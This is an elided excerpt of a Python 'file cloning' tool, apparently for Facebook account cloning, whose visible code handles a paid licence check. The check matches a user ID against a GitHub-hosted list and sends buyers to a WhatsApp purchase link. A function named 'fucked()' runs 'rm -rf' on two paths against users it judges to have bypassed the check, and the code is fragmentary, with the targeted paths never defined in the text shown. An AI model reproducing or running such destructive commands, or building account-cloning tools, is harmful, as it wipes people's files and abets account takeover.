...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/Normal.User.Alamgir?mibextid=ZbWKwL')
time.sleep(5)
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Normal.User.Alamgir?mibextid=ZbWKwL')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
 \033[97;1m   ___    __    ___    __  _________________ 
\033[97;1m   /   |  / /   /   |  /  |/  / ____/  _/ __ \
\033[97;1m  / /| | / /   / /| | / /|_/ / / __ / // /_/ /
\033[97;1m / ___ |/ /___/ ___ |/ /  / / /_/ // // _, _/ 
\033[97;1m/_/  |_/_____/_/  |_/_/  /_/\____/___/_/ |_|  
...
#####os.system('espeak -a 300 " WELCOME TO BANGLADESH HOKAR POTTI  FILE CLONING TOOLS"')
pass
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('AssalamuAlaylum%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('xdg-open https://wa.me/+880171234653?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
...
def fucked():
    ...
    os.system(f"rm -rf {y}")
    os.system(f"rm -rf {z}")
    print(' Fuck You Bypass User Security By ALAMGIR \ . 0o');exit()

def ckx():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    server = requests.get(f'https://github.com/fuck-boy-alam-vau-tera-papa/approval.txt/blob/main/approval.txt').text
    try:
        httpCaht = requests.get(f"https://github.com/fuck-boy-alam-vau-tera-papa/approval.txt/blob/main/approval.txt").text
        if id in httpCaht:
            msg = str(os.geteuid())
            #pass
        else:
